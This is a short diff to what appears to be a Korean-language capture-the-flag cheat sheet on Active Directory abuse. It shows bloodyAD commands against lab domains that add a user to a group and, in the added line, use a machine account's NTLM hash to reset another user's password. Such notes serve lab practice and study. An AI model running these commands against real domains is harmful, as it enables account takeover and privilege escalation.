@@ -863,6 +863,8 @@ bloodyAD -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 -d puppy.htb remov
 - 레거시에서는 `net rpc`가 작동하나 최신 AD 환경에서는 작동하지 않아 `bloodyAD`를 사용.
 ```bash
 bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember infrastructure alfred
+
+bloodyAD -d tombwatcher.htb -u ansible_dev$ -p 93f81a98d22217b6206d950528a4802e:93f81a98d22217b6206d950528a4802e --host dc01.tombwatcher.htb set password sam password
 ```
   
 </details>
